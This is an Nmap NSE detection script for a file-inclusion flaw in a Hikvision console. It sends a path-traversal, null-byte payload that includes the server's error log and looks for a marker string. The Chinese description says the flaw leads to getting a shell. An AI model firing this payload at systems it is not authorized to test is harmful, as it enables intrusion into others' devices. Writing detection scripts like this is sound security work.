local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"


description = [[
海康威视某系列控制台文件包含导致getshell
在controller参数的一个任意文件包含：包含日志文件getshell
]]


author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "hikvision", "hikvision_lfi_06", "vuln_detect" }

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	stdnse.verbose("[*] start check vulnerable.")
	local payload = "/index.php?controller=../../../../Server/logs/error.log%00.php"
	local output = stdnse.output_table()
	
	local response = http.get(host, port, payload)

	if response.status == 200 then
		content = response.body
		if string.find(content, "Venus01") ~= nil then
			output = "Found vulnerable."
		else
			output = "Not vulnerable."
		end
	else
		output = "Not vulnerable."
	end
	return output
end

